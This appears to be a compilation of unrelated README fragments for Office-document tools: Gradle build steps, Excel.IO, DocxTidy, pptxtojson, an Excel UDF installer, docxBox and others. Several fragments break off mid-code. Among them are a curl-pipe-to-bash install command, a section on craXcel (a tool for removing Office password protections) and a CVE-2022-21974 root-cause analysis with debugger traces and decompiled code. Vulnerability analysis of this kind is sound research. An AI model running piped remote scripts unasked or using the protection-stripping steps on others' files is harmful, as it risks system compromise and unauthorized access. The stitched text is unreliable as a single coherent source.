NOTE: to make the HelloWorld example work, you would have to change the template and output paths in the `HelloWorld.java` file, because we're now running the example from the 'src'-folder:
`./data/template.docx` -> `../data/template.docx` and `./data/output` -> `../data/output`

## Gradle
### Installation (Linux)
First download `SDKMAN!` by typing in your terminal:
```bash
curl -s ""https://get.sdkman.io"" | bash
```
Then open another terminal (important for `SDKMAN!` to get recognized) and install Gradle by typing in your terminal:
```bash
sdk install gradle 7.2
```
For more information about the installation, see the [official installation guide](https://gradle.org/install/).
### Building (includes running tests and generating .jar file)
```bash
./gradlew build
```
### Generate .jar file
```bash
./gradlew jar
```
### Run tests
```bash
./gradlew test
```
### Generate documentation
```bash
./gradlew javadoc
```
### Generate dependency licenses
Also see the [licenses section](#licenses).
```bash
./gradlew generateLicenseReport
```
### Clear build-folder
If you want to clear the build-folder:
```bash
./gradlew clean
```
NOTE: this will delete the whole build-folder, so also the .jar file, documentation, dependency licenses and build-files

## Licenses
Because we bundle external dependencies in our .jar file, we add the licenses for all the dependencies to this project. For this we use a [Gradle plugin](https://github.com/jk1/Gradle-License-Report). The licenses can be found in the folder `cloudofficeprint/build/reports/dependency-license`.

## Publishing
For publishing, uncomment the 'publishing'-block in the `build.gradle` file and run in your terminal:
```bash
./gradlew publish
```

If you first want to test locally, type in your terminal:
```bash
./gradlew publishToMavenLocal
```
The local Maven project can then be found in the folder ~/.m2/repository/com/cloudofficeprint/ (where ~ is your home folder).

# Excel.IO

The goal of this project is to simplify reading and writing Excel workbooks so that the developer needs only pass a collection of objects to write a workbook. Likewise, when reading a workbook the developer supplies a class with properties that map to column names to read a collection of those objects from the workbook. 

Excel.IO takes a single dependency on the [Open XML SDK](https://github.com/OfficeDev/Open-XML-SDK) and targets .NET Standard 2.0

## Features

* Easy to use developer API
* Write one or more worksheets per workbook by passing a collection of strongly typed objects
* Read one or more worksheets from a workbook into a collection of strongly typed objects

## Limitations

* Assumes workbook structure where the first row has column headers
* Reading multiple worksheets is a little inefficient
* Localisation isn't currently supported 

## Example: Writing a worksheet

Implement [IExcelRow](../master/src/Excel.IO/IExcelRow.cs) and define the columns of the spreadsheet as public properties:

```csharp
public class Person : IExcelRow
{
    public string SheetName { get => ""People Sheet""; }

    public string EyeColour { get; set; }

    public int Age { get; set; }

    public int Height { get; set; }
}
```

Then create instances and pass a collection to an instance of [ExcelConverter](../master/src/Excel.IO/ExcelConverter.cs) to write a single sheet workbook with several rows:

```csharp
var people = new List<Person>();

for (int i = 0; i < 10; i++) 
{
  people.Add(new Person
  {
    EyeColour = Guid.NewGuid().ToString(),
    Age = new Random().Next(1, 100),
    Height = new Random().Next(100, 200)
  });
}

var excelConverter = new ExcelConverter();
excelConverter.Write(people, ""C:\\somefolder\\people.xlsx"");
```

## Example: Reading a worksheet

Implement [IExcelRow](../master/src/Excel.IO/IExcelRow.cs) and define public properties with the same name as columns of the spreadsheet (we'll just reuse the same class from above):

```csharp
public class Person : IExcelRow
{
    public string SheetName { get => ""People Sheet""; }

    public string EyeColour { get; set; }

    public int Age { get; set; }

    public int Height { get; set; }
}
```

Then, ask an instance of [ExcelConverter](../master/src/Excel.IO/ExcelConverter.cs) to read an IEnumerable<Person> from disk:

```csharp
var excelConverter = new ExcelConverter();
var people = excelConverter.Read<Person>(""C:\\somefolder\\people.xlsx"");

foreach(var person in people)
{
  //do something useful with the data
}
```

## What is this?

This package is a utility that takes an [ooxast] (docx) syntax tree as input and turns it into a [unified-latex] (LaTeX) syntax tree.

## When should I use this?

This project is useful when you want to deal with ASTs and turn OOXML into LaTeX.

The reoff plugin [reoff-unified-latex] wraps this utility to also turn markdown to HTML at a higher-level (easier) abstraction.

## Install

This package is [ESM only](https://gist.github.com/sindresorhus/a39789f98801d908bbc7ff3ecc99d99c). In Node.js (version 12.20+, 14.14+, 16.0+, 18.0+), install as

```bash
pnpm add ooxast-util-to-unified-latex
# or with yarn
# yarn add ooxast-util-to-unified-latex
# or with npm
# npm install ooxast-util-to-unified-latex
```

## Production Environment Setup
Please refer to [AOAI-for-Word-backend](https://github.com/Alan-Kuan/AOAI-for-Word-backend).

## Development Environment Setup on Windows
1. Install [winget](https://learn.microsoft.com/zh-tw/windows/package-manager/winget/).
    - It probably has already been installed on Windows.
2. Start PowerShell and use winget to install Node.js LTS and pnpm.
    - It's recommended to start PowerShell on [Windows Terminal](https://learn.microsoft.com/en-us/windows/terminal/install).
    ```sh
    winget install openjs.nodejs.lts pnpm
    ```
3. [Optional] Add an alias for pnpm in PowerShell's profile.
   - If you skip this step, you'll have to use `pnpm-win-x64.exe` in latter steps
    ```powershell
    Set-Alias -Name pnpm -Value pnpm-win-x64.exe
    ```
3. Restart PowerShell.
4. Clone the repo.
    ```sh
    git clone https://github.com/Alan-Kuan/AOAI-for-Word
    ```
5. Install dependencies.
    ```sh
    pnpm install
    ```
6. Create certificates for development purposes.
    ```sh
    npx office-addin-dev-certs install --days <validity period in days>
    ```
7. Start development server.
    ```sh
    pnpm dev
    ```
8. Sideload the Add-in.
   ```sh
   pnpm sideload
   ```

## Installation
Add it in your root build.gradle at the end of repositories:
```
allprojects {
  repositories {
    maven { url 'https://jitpack.io' }
  }
}
```

Add the dependency
```
dependencies {
	        implementation 'com.github.p32929:MaterialOfficeAbout:1.0.6'
}
```

# How to use:
## 1. Initialize:
To initialize you can use ```new OfficeAboutHelper(context, jsonUrl)``` like this:

```
OfficeAboutHelper officeAboutHelper = new OfficeAboutHelper(this, ""https://raw.githubusercontent.com/p32929/SomeHowTosAndTexts/master/Office/OfficeInfoMaterial.json"");
```

## 2. Show about activity:
You can show the about activity in 4 ways.

1. ```officeAboutHelper.showAboutActivity();``` // It will show a toolbar by default
2. ```officeAboutHelper.showAboutActivity(boolean showToolbar);```
3. ```officeAboutHelper.showAboutActivity(boolean showToolbar, LoadListener listener);```
4. ```officeAboutHelper.showAboutActivity(LoadListener listener);``` // It will show a toolbar by default

* Tip: If you want to add some more views dynamically, you might wanna use the ```LoadListener listener``` and add the views in ```onLoad(LinearLayout linearLayoutDummy)``` callback.
* Tip: If you want to shuffle the members list but keep someone at the top, you can use ```shuffleAndBringSomeoneTopByName()``` or ```shuffleAndBringSomeoneTopByDesignation()``` methods
For more info, check out the app in the repository

And lastly, if you are using Pro Guard add this line(Otherwise, the app will crash):

```
-keep public class org.richit.materialofficeaboutlib.Models.** { *; }
```

# What is craXcel

craXcel (""crack-cel"") is a tool that makes removing various password protections from Microsoft Office files seemless. It works by directly amending the underlying XML files that make up modern Microsoft Office files.

Please note that craXcel cannot unlock encrypted files.

---

# Supported applications

As of V1.0:

- Microsoft Excel (workbook, worksheet, vba)
  - .xlsx
  - .xlsm
- Microsoft Word (modify, format, vba)
  - .docx
  - .docm
- Microsoft Powerpoint (modify, vba)
  - .pptx
  - .pptm

## Important note on unlocking the VBA project of macro files

Upon unlocking the VBA Project of a Macro Enabled file, that file will state it has encountered issues and needs to recover... __DO NOT PANIC__, this is normal.

The steps to follow to complete the unlock is as follows:

1. Open the unlocked file and click 'Enable Content' on the warning:

![image](https://user-images.githubusercontent.com/50495755/94193731-9e2e0b80-fea8-11ea-818f-45ac9ac7b80e.png)

2. Click 'OK' on the following pop-up:

![image](https://user-images.githubusercontent.com/50495755/94193790-b56cf900-fea8-11ea-8f73-2b27378b1e3d.png)

3. Open Visual Basic from the Developer toolbar:

![image](https://user-images.githubusercontent.com/50495755/94193894-d59cb800-fea8-11ea-9cc6-6a88008a853e.png)

4. Open VBAProject Propeties under Tools:

![image](https://user-images.githubusercontent.com/50495755/94193982-f5cc7700-fea8-11ea-8dad-9d0ccb3cf921.png)

5. Navigate to the Protection tab and enter a new password (a one character password is fine, as we will be removing it again straight away). Click 'OK'.

![image](https://user-images.githubusercontent.com/50495755/94194050-0ed52800-fea9-11ea-9cf9-315a1a0fc7fc.png)

6. Head back in to VBAProject Properties > Protection tab, and de-select the 'Lock project for viewing' checkbox and clear any passwords in the boxes below. Click 'OK'.

7. The modules will now be unlocked and you can save the document without having to repeat these steps.

![image](https://user-images.githubusercontent.com/50495755/94194188-40e68a00-fea9-11ea-9f1d-77ea49010a4b.png)

__Note to developers:__ If you're willing to take on the challenge of automating these steps (preferably without user input mimicking...) you are welcome to contribute!

Description
-----------

A PHP library to tidy DOCX XML files: merges successive elements of same type and properties.

By simplifying the markup of DOCX XML, DocxTidy alleviates the efforts needed for custom modifications (for instance DOCX-based templating).

* Merges successive runs having identical run-properties
* Merges successive elements of same type (&lt;w:t&gt;, &lt;w:instrText&gt;) within each run


DocxTidy supports two tidying modes:

1. DOCX files (includes unpacking and re-archiving of contained XML files)
2. XML string


Please Note
-----------

* By merging segmented tags, DocxTidy removes versioning/editing history information
* When run with default settings, DocxTidy removes spellchecking flags (""noProof"", ""proofErr"", ""lang"")
* DocxTidy removes all xml:space=""preserve"" flags and re-inserts xml:space=""preserve"" into all &lt;w:t&gt; and &lt;w:instrText&gt; tags
* To standardize run properties, DocxTidy deletes any font hints
* After unifying consecutive runs w/ identical properties and removing any spellchecking flags, DocxTidy removes any resulting empty tags

This library is distributed on an “AS IS” BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, 
either express or implied.


Installation
------------

The recommended way to install is via Composer:

```bash
$ composer require gyselroth/docx-tidy
```

PHP 7.1 is required since DocxTidy version 0.5.0 (PHP 5.6 until version 0.4.5)


Usage
-----

### Example 1: Tidy a whole DOCX file

```php
<?php

use DocxTidy\DocxTidy;

// tidy a DOCX file
(new DocxTidy())->tidyDocx('path/to/your.docx');
```

### Example 2: Tidy an XML (string)

```php
<?php

use DocxTidy\DocxTidy;

// read DOCX XML, e.g. ""document.xml"" / ""header1.xml"" / etc
$xml = file_get_contents('path/to/your_unzipped_docx/word/document.xml');

// tidy DOCX XML string
$xml = (new DocxTidy())->tidyXml($xml);
```

- 删除了所有非核心代码，仅关注 XML 的解析过程；
- 输出 JSON 格式的解析结果；

# 🔨安装
> npm install pptxtojson

# 💿用法
```html
<input type=""file"" accept=""application/vnd.openxmlformats-officedocument.presentationml.presentation""/>
```

```js
import { parse } from 'pptxtojson'

document.querySelector('input').addEventListener('change', evt => {
	const file = evt.target.files[0]
	
	const reader = new FileReader()
	reader.onload = async e => {

Excel User-Defined-Functions (UDF) Automation Add-In [^2] with integrated Installer, both written in VB.Net

Full Microsoft Visual Studio 2022 solution and project source code.

Installers for both 32-Bit and 64-Bit Office / Excel included.

Click on Releases > Assets for pre-built examples.

<details><summary>Background Information</summary>
<p>
  
Excel User-Defined Functions (UDFs) as developed in VB.Net have been around for many years, early examples of which include - 

* http://www.cpearson.com/Excel/CreatingNETFunctionLib.aspx

* https://www.codeproject.com/Articles/7753/Create-an-Automation-Add-In-for-Excel-using-NET

Whilst these functions work well, the deployment of them can be more problematic, particularly where end users may not be familiar with, or are permitted to run command-line utilities such as [Regasm](https://learn.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool) to complete the installation. 

</p>
</details>  

<details><summary>Design Goals</summary>
<p>

The design goals for this project are therefore :-

* Working Excel Automation Add-In with sample functions provided
* Integrated 'Click-Through' Installer, more familiar to end-users
* All development in VB.Net, using Microsoft Visual Studio 2022
* No third-party libraries or utilities required
* Coding style to support infrequent developers
* Installers for both 32-Bit and 64-Bit Office

</p>
</details> 

<details><summary>Dependencies</summary>
<p>

A Windows PC with the following software installed is required to build the solution 

* Microsoft Windows 10, 64-Bit
* Microsoft .Net Framework 4.7.2
* Microsoft Office/Excel 32-Bit or 64-Bit
* Microsoft [Visual Studio 2022 (any edition)](https://learn.microsoft.com/en-us/visualstudio/releases/2022/system-requirements)

A 'fresh build' of all the above components is recommended, on a dedicated development PC if possible, and with all updates applied.

Visual Studio should have the following items installed

* Workload [.Net Desktop Development](/SCREENSHOTS/VISUAL_STUDIO_WORKLOAD_DOTNET_DESKTOP.png)
* Workload [Office/Sharepoint Development](/SCREENSHOTS/VISUAL_STUDIO_WORKLOAD_OFFICE_DEVELOPMENT.png)
* Extension [Visual Studio Installer Projects 2022](/SCREENSHOTS/VISUAL_STUDIO_EXTENSIONS.png)

<details><summary>Optional Utilities</summary>
<p>

The following utility is useful to inspect the Registration process, but is not mandatory.

* https://www.nirsoft.net/utils/registered_dll_view.html

</p>
</details> 

</p>
</details> 

<details><summary>32/64 Bit Office</summary>  
<p>

The Automation Add-In is registered during the installation process.

Different values need to be written to the [Registry](/DOCUMENTS/OFFICE_32_64.md) for 32-Bit and 64-Bit versions of Office.

The installer class provides these values, [Custom Action Properties](/SCREENSHOTS/CUSTOM_ACTIONS_RUN64BIT.png) is set for the version required in each installer project.

Separate 32-Bit and 64-Bit Office installer projects are provided and should be built for each version required. 

</p>
</details> 

<details><summary>Automation Add-In</summary>  
<p>

<details><summary>Automation Add-In - User Installation</summary>  
<p>

Visual Studio generates two output files, `setup.exe` and `AUTO_INSTALLER_nn.msi` from each Installer project

Either of these files can be distributed to, and run by end users, to install and uninstall as required. 

</p>
</details> 

<details><summary>Automation Add-In - Excel Configuration</summary>
<p>

After running the [installer](/SCREENSHOTS/USER_INSTALL_01.png), users need to configure Excel to enable the Automation Add-In.

From Excel > File > Options > [Add-Ins](/SCREENSHOTS/EXCEL_ADDIN_01.png) > [Manage Excel Add-Ins](/SCREENSHOTS/EXCEL_ADDIN_02.png) 

Click on Automation, scroll down and select [AUTOMATION.Functions](/SCREENSHOTS/EXCEL_ADDIN_03.png)

Click [OK](/SCREENSHOTS/EXCEL_ADDIN_04.png) to confirm

</p>
</details> 

<details><summary>Automation Add-In - Excel Formulas</summary>
<p>
  
Two sample [Excel formulas](/SCREENSHOTS/EXCEL_FORMULAS_01.png) are supplied

`=IFX()` in a Worksheet cell returns the text string `AUTO FX OK`

`=TIMENOW()` in a Worksheet cell returns the current time with milliseconds e.g. `12:34:56.789`

This is a 'Volatile' function and will re-calculate when the F9 key is pressed or another cell changes. 

Functions offered by the Add-In can be listed by clicking on Formulas > Insert Function and selecting [AUTOMATION.Functions](/SCREENSHOTS/EXCEL_INSERT_FUNCTION.png)
as a category

</p>
</details> 

<details><summary>Automation Add-In - Uninstalling</summary>
<p>

Users can uninstall the Add-In by right-clicking the Windows Start button and selecting [Apps and Features](/SCREENSHOTS/APPS_AND_FEATURES.png)

Scroll down to *Automation FX* and select Uninstall

<details><summary>Implementation Notes</summary>
<p>

<details><summary>Installer Class Module</summary>
<p>

#### Installer Class Module
Class module `Installer.vb` performs the Assembly Registration and Registry updates required when the developer or end-user runs the installer .exe or .msi program. 

Tag `<System.ComponentModel.RunInstaller(True)>` is provided automatically by vb.net in file `Installer.Designer.vb` when a new Installer class module is added to a project.

This tag is used by the installer program to call `Public Overrides Sub Install(stateSaver As IDictionary)` via [Custom Action Properties](/SCREENSHOTS/CUSTOM_ACTIONS_INSTALLERCLASS.png) in projects AUTO_INSTALLER_32 and AUTO_INSTALLER_64.

Sub `Install` then calls `RegisterAssembly` which is functionally equivalent [^1] to running `RegAsm.exe` manually. 

`RegAsm.exe` itself  _uses methods exposed by RegistrationServices_ [^3]

</p>
</details> 

<details><summary>COM Configuration Properties</summary>
<p>

#### Project AUTO_FUNCTIONS - Properties
The following points should always be observed to avoid performing any conflicting Registry updates during development and testing.

In project AUTO_FUNCTIONS > Properties, the options below should **not** be selected at any time.
- [ ] `Register for COM Interop` in section Compile 
- [ ] `Make assembly COM-Visible` in section Application > Assembly Information

Tags `<ComRegisterFunction>` and  `<ComUnRegisterFunction>` should also **not** be used in any module.

___

#### Projects AUTO_INSTALLER_32 and AUTO_INSTALLER_64 - Primary Output Properties

In each project > Primary Output Properties, [Register](/SCREENSHOTS/PRIMARY_OUTPUT_DO_NOT_REGISTER.png) should be set to **vsdrpDoNotRegister**

</p>
</details> 

<details><summary>Production Build</summary>
<p>

A new [Production Build](/DOCUMENTS/RELEASE_BUILD.md) should be developed to ensure that all GUIDs are unique and all Visual Studio updates, references and dependencies are incorporated.

## What is Meta Tag Analyzer?
**Preface:** We all agree how important meta tags are to our website. It helps describe the contents of a page and thereby providing more useful information for search engines to display. You can also dictate what information is shown when you share a page from your website on social media.   

**Meta Tag Analyzer** is an Azure DevOps task that provides you with the ability to automatically run a check on your website and generate a report of the meta tag information. Benefits:
- **Assurance:** Ensure that your last release hasn't changed anything unexpectedly that will be impact your online presence   
- **Automatic and part of your value stream:** Don't neglect the significance of meta tag content by checking this on a one-off basis. Include this as part of your pipeline and part of each release artifact.
- **Comprehensive and easy to read:** Simply download this report and email it to the team that looks after your online presence. 

Meta Tag Analyzer Azure DevOps task will:   
- Generate an Excel report after analysing the meta tags of all your pages ([Download sample report](https://github.com/ClydeDz/meta-tag-analyzer/blob/master/Sample/meta-tag-analyzer-report.xlsx)).
- Log the analysis to the console too, so you get the same information from within the pipeline itself.

### Additional notes
#### Downloading the report
This task generate the report in the working directory but doesn't copy the file to the drop location. If you'd like the file to be included in the artifacts, ensure you explicitly include it. [Read more](https://github.com/ClydeDz/meta-tag-analyzer/wiki#usage) for ideas around this.   

#### What about adding it to the release definition?
Since you cannot publish artifacts from your release definition, ensure you either:
- Upload the generated report to an external file server, storage account or a web app's folder, or;   
- Trigger a *'post release'* build from the release pipeline.  
[Read more](https://github.com/ClydeDz/meta-tag-analyzer/wiki#usage) for ideas around this.

Image Editor is a web app that runs on the Office 365 platform on multiple host apps (Teams, Office, Outlook). The app allows users to edit, save, open, and save images, using Microsoft Graph API. 

Use this project as a template to create your own web app that can be used in all three Microsoft host apps.

## Development

### Clone repository

`git clone https://github.com/OfficeDev/m365-extensibility-image-editor.git`

Run all commands from the root of m365-extensibility-image-editor

### Prerequisites

Node.js
<https://nodejs.org/en/>

Yarn
<https://yarnpkg.com/getting-started/install>

### Install

run `yarn install`

### Build and run

To run on localhost using webpack devserver:

`yarn start`

Dev server will run on <https://localhost:8080> by default.
  
Ignore and skip unsafe localhost (no localhost cert) in the browser for development.
Alternatively use your own cert and domain name.

### Registering the app and setting up sign in

In order to get sign in with MSAL working for the Image Editor app (to get Microsoft Graph API functioning), you have to do these essential steps:
  
1. **Create test tenant**
For creating a test tenant see <https://docs.microsoft.com/en-us/office/developer-program/microsoft-365-developer-program-get-started>

2. **Register the app as an enterprise application**

    - Get credentials for the admin of your test tenant
    - Go to <https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade>
    - Click '+ New registration'.
    - Enter a custom name for your App
    - **Supported account types** - Accounts in any organizational directory (Any Azure AD directory - Multitenant)
    - **Redirect URI** - Field1: ""Single-page application (SPA)"" Field2 (host src): ""https://localhost:8080/""
    - Click Register

3. **Changing app configs**

    - We need to set the new application id into the configs of the app code.
    - If have not done so, clone this repository.
    - Go to <https://portal.azure.com/#blade/Microsoft_AAD_RegisteredApps/ApplicationsListBlade> to see all of your app registrations
    - Click on the 'All applications'
    - Click on the entry of your **App Registration** made in step 2.
    - Take note of the application id from the overview tab of the app registration, this value should be a guid
    - Go back to the root of the image editor repository
    - in '.env.dev' file, change APP_ID field to the application id you obtained above.
    - in '.env.prod' file, change APP_ID field to the application id you obtained above.

4. **Applying admin approvals**
    - We need to, as an admin, give consent to the app to access the tenant's resources and services.
    - Go to the base of the repo and run `yarn start` to start the Image Editor app.
    - Attempt to sign in with the admin credentials for the tenant you created.
    - Permision Requested: As the admin, check the 'Consent on behalf of your organization' and click Accept. (another dialog to request the same consent may show up).
    - Now on the App you should see an error: 'Loading error: Error in loadDataStore, innerError: Error in mountDefaultPod, innerError: Unable to retrieve user's OneDrive domain.' You have to grant permission to Onedrive (through the graph api). To do this...
    - Go to <https://portal.azure.com/#blade/Microsoft_AAD_IAM/StartboardApplicationsMenuBlade/Overview> and see that there is a new entry for the Image Editor App.
    - Click on 'All Applications' on the side bar.
    - In the list, Click on the Image Editor app with the name you've assigned it.
    - Click on Permissions.
    - Click on 'Grant Admin Consent'
    - **Permissions requested Review for your organization** : Click accept. (The dialog might be frozen on 'redirect', just exit it).
    - Refresh the previous page, you should see an entry for 'Graph API' that was granted.
    - Go back to the 'Image Editor App', refresh, and try to login again.
    - A few more consents may be needed to be granted. As the admin, check the 'Consent on behalf of your organization' and click Accept for all of them.
    - You may need to refresh and login again to find it has succeeded.
    - Now you can sign in to the Image Editor app.

### Running across Microsoft 365 (Office.com, Outlook, and Teams)

Within Microsoft Teams, a user can upload a 'manifest file' (json config file) that is then read by the other Microsoft host apps (Outlook, Office), to host the Image Editor app within their experiences - giving the user access to the app in all three locations. This manifest will have information on your registered app id, website url, and more. The following instructions is for a dev testing, localhost, manifest.
  
1. run `yarn start`, ensure app is running on localhost:8080
2. edit manifest file **configs\hosts\manifest.json** so the id property value matches the app registration you set up above.
3. Set a list of valid domains under 'validDomains', which accepts an array with type string
4. zip all files in the **configs\hosts** folder (do not zip the folder itself, just the contents)
5. go to <https://dev.teams.microsoft.com/apps> and click **Import App** to upload the .zip file.
6. go to the new app's entry, click **preview app**, and 
teams has loaded, click add.

By default the app will only show up in your teams application. To enable a multi-hub experience, you will need to meet certain prerequisites as described in this article: <https://docs.microsoft.com/en-us/microsoftteams/platform/m365-apps/prerequisites>
  
Please note that after enrolling your developer tenant for Office 365 Targeted releases, it may take upwards of 5 days for your tenant to be part of the release. After that, you will be able to see your app in outlook and office.

<img src=""00_documentation/screenshot-legacy.png"">

## Introduction

The BKT Legacy Toolbox is a VBA-based toolbar for Microsoft PowerPoint. It is the predecessor of the [BKT](https://github.com/pyro-team/bkt-toolbox/). Compared to the newer BKT written in Python the Legacy Toolbar has less features, various restrictions and is not extensible. However, unlike the BKT it will mostly run on Mac Office.

The BKT is developed by us in our spare time, so we cannot offer support or respond to special requests.

### Language

Historically, the BKT Legacy Toolbar was developed in German and unfortunately, we do not have the time to translate the whole toolbox. We hope that most functions are self-explanatory. If you have experience in multi-language VBA projects, feel free to support us.

## System requirements

The BKT Legacy Toolbar runs under Windows from Office 2010 in all current Office versions as well as on Mac starting with Office 2016. Some functions are not available on Mac though.

## Installation

The PowerPoint-Addin can be downloaded as [compiled `BKT-Legacy.ppam` file](https://github.com/pyro-team/bkt-legacy/releases/latest). (Same version as in `30_builds\10_stable\`.)

* On Windows it can be installed at File > Options > Add-Ins > Select ""PowerPoint-Add-Ins"" in Menu below > In new dialog click Add and select downloaded file.
* On Mac go to Extras > PowerPoint-Add-Ins and click ""+"" to select the downloaded file. Confirm any security questions to activate macros.
* In order to add template slides via menu in PowerPoint, you need to download the `Templates.pptx` file and place it next to the addin file. Feel free to add your own template slides.

## Development

To install the development version please refer to instructions on [20_development/DEV.md](20_development/DEV.md).

<p align='center'>
<img src='pics/cve-2022-21974.gif'>
</p>

## Root-cause

The `RMSRoamingSecurity!ATL::CComCreator<ATL::CComObject<CRmsRoamingSecurity> >::CreateInstance` constructor allocates and initializes a `CRmsRoamingSecurity` object (0x3470 bytes) but it fails to initialize completely its state.

For example, at offset 0x3458 there is an uninitialized pointer that gets free'd when the destructor is invoked (in `CRmsRoamingSecurity::_Cleanup`):

```
0:000> 
RMSRoamingSecurity!CRmsRoamingSecurity::_Cleanup+0x29:
00007ffd`719767a5 488b8b58340000  mov     rcx,qword ptr [rbx+3458h] ds:000001c6`612f9fe8=c0c0c0c0c0c0c0c0

0:000> p
RMSRoamingSecurity!CRmsRoamingSecurity::_Cleanup+0x30:
00007ffd`719767ac 4885c9          test    rcx,rcx

0:000> 
RMSRoamingSecurity!CRmsRoamingSecurity::_Cleanup+0x33:
00007ffd`719767af 7414            je      RMSRoamingSecurity!CRmsRoamingSecurity::_Cleanup+0x49 (00007ffd`719767c5) [br=0]

0:000> 
RMSRoamingSecurity!CRmsRoamingSecurity::_Cleanup+0x35:
00007ffd`719767b1 48ff15e0b90000  call    qword ptr [RMSRoamingSecurity!_imp_CoTaskMemFree (00007ffd`71982198)] ds:00007ffd`71982198={combase!CoTaskMemFree (00007ffd`ce8454d0)}
```

This is the function using the uninitialized data, see `[0]` and `[1]`:

```c++
void __fastcall CRmsRoamingSecurity::_Cleanup(struct_v7 *this)
{
  void *v2; // rcx
  void *qword3460; // rcx
  void *qword33E8; // rcx

  if ( this->qword33E0 )
  {
    IpcFreeMemory();
    this->qword33E0 = 0i64;
  }
  v2 = *(void **)&this->gap33F0[104];      // <--- [0] uninitialized
  if ( v2 )
  {
    CoTaskMemFree(v2);                     // <--- [1] free
    *(_QWORD *)&this->gap33F0[104] = 0i64;
  }
  //...
}
```

Commands
--------

### Unzip DOCX: All files, or only media files, format XML

**Unzip all files:** ````docxbox uz foo.docx````  

**Unzip only media files:**  
````docxbox uzm foo.docx````
or ````docxbox uz foo.docx -m````  
or ````docxbox uz foo.docx --media````    

**Unzip all files and indent XML files:**  
````docxbox uzi foo.docx````  
or ````docxbox uz foo.docx -i````  
or ````docxbox uz foo.docx --indent````  


### Zip files into DOCX

````docxbox zp path/to/directory out.docx````

**Compress XML, than zip files into DOCX:**

When having indented XML 
(i.e. via [``uzi``](#unzip-all-files-and-indent-xml-files) command) for manual 
manipulation, the ``zpc`` command compresses (= unindents) all XML files before 
zipping them into a new DOCX:

````docxbox zpc path/to/directory out.docx````  


### Output DOCX contents

#### List files: All, filtered, images only

**Lists files** contained within a given DOCX, and their attributes:

````docxbox ls foo.docx````

![List contents of DOCX archive](https://raw.githubusercontent.com/gyselroth/docxbox/master/screenshots/docxbox-docx-ls.png)

To output as JSON:

````docxbox lsj foo.docx````  
or ````docxbox ls foo.docx -j````  
or ````docxbox ls foo.docx --json````  

##### Filter by wildcard

````docxbox ls foo.docx *.xml```` Lists only files ending w/ ``.xml`` 

##### List all files containing string or regular expression

````docxbox lsl foo.docx foo```` Lists all files containing the string ``foo``  
or ````docxbox ls foo.docx -l foo````  
or ````docxbox ls foo.docx --locate foo````  

This command is a shorthand to the grep tool (must be installed on your system 
when using this command).  
The search-string therefor can also be given as a regular expression:

````docxbox lsl foo.docx '/[0-9A-Z]\{8\}/'````  
Lists all files containing 8-digit IDs, e.g. word recent session IDs 
(ISO/IEC 29500-1). 

##### List all files containing string or regular expression as JSON

````docxbox lslj foo.docx foo````  
or ````docxbox lsl foo.docx -j foo````  
or ````docxbox ls foo.docx -lj foo````  
or ````docxbox lsl foo.docx --json foo````  
or ````docxbox ls foo.docx --locate -j foo````  
or ````docxbox ls foo.docx --locate --json foo````  


##### List image files

Output list of contained images and their media attributes (like width, height, 
encoding, compression, etc.)

````docxbox lsi foo.docx````  
or ````docxbox ls foo.docx -i````  
or ````docxbox ls foo.docx --images````  

To output as JSON:

````docxbox lsij foo.docx````  
or ````docxbox lsi foo.docx -j````  
or ````docxbox ls foo.docx -ij````  
or ````docxbox lsi foo.docx --json````  
or ````docxbox ls foo.docx --images --json````  

**Note:** Media attributes are read using the 
[``file``](https://darwinsys.com/file/) command, which must be installed on your
system (but usually should be already) when using docxBox's ``lsi`` command.


#### List meta data

docxBox displays only attributes that are contained within the current 
DOCX file (the attributes can vary by DOCX version and word processor used for 
creation), also if given empty.

Output meta data of given DOCX:  

````docxbox lsm foo.docx````  
or ````docxbox ls foo.docx -m````  
or ````docxbox ls foo.docx --meta````

![List document meta data](https://raw.githubusercontent.com/gyselroth/docxbox/master/screenshots/docxbox-docx-lsm.png)

To output as JSON:

````docxbox lsmj foo.docx````  
or ````docxbox lsm foo.docx -j````  
or ````docxbox ls foo.docx -mj````  
or ````docxbox lsm foo.docx --json````  
or ````docxbox ls foo.docx --meta --json````    

  
#### Reference: Recognized meta attributes

* **Language** (``<dc:language>`` of docProps/core.xml) 
* **Revision** (``<cp:revision>`` of docProps/core.xml)
* **Application** created with and its version, name of used template, company,
  XML schema of document (``<Application>``, ``<AppVersion>``, ``<Template>``, 
  ``<Properties xmlns ...`` and ``<Company>`` of docProps/app.xml)


#### List referenced fonts

````docxbox lsf foo.docx````  
or ````docxbox ls foo.docx -f````  
or ````docxbox ls foo.docx --fonts````  

![List referenced fonts](https://raw.githubusercontent.com/gyselroth/docxbox/master/screenshots/docxbox-docx-lsf.png)

To output as JSON:

````docxbox lsfj foo.docx````  
or ````docxbox lsf foo.docx -j````
or ````docxbox ls foo.docx -fj````  
or ````docxbox lsf foo.docx --json````  
or ````docxbox ls foo.docx --fonts --json````


#### List fields

````docxbox lsd foo.docx````  
or ````docxbox ls foo.docx -d````  
or ````docxbox ls foo.docx --fields````  

To output as JSON:  

````docxbox lsdj foo.docx````  
or ````docxbox ls foo.docx -dj````  
or ````docxbox lsd foo.docx --json````  
or ````docxbox ls foo.docx --fields --json````  


#### Output XML

````docxbox cat foo.docx word/_rels/document.xml.rels````  
outputs the given file's XML, indented for better readability.

**Hint:** For viewing or editing complex XML, e.g. with syntax highlightning, 
you can use your favorite text editor via the 
[``cmd`` command](#arbitrary-manual-and-scripted-analysis--modification)


#### Output document as plaintext

````docxbox txt foo.docx```` outputs the given document's plaintext
(ATM: w/o header and footer)

**Output plaintext segments:**  
````docxbox txt foo.docx -s````   
or ````docxbox txt foo.docx --segments````   

Outputs the plaintext from document, with markup sections separated by newlines.
This can be helpful to identify ""segmented"" sentences:
Texts which visually appear as a unit, but are declared within multiple separate
XML elements (due to formatting or change-tracking purposes).


### Compare DOCX documents

docxBox helps tracing changes to the files contained within DOCX archives,
made when manipulating documents in word processor applications.

When given two DOCX files, the ``ls`` command lists all files of both DOCX
documents side-by-side. docxBox compares all files and highlights files 
w/ different attributes or (identical attributes but) different content. 

````docxbox ls foo_v1.docx foo_v2.docx````  

**Note:** Comparisons are always output as plaintext, JSON output is not supported. 


![Compare two documents](https://raw.githubusercontent.com/gyselroth/docxbox/master/screenshots/docxbox-docx-ls-compare.png)

#### Compare specific file from two DOCX archives

Files that have changed between versions of a document, can be inspected using 
the ``diff`` tool (which must be installed on your system).  
 
Display **side-by-side** comparison of the formatted XML of given file 
(``word/settings.xml``), with differences indicated:  
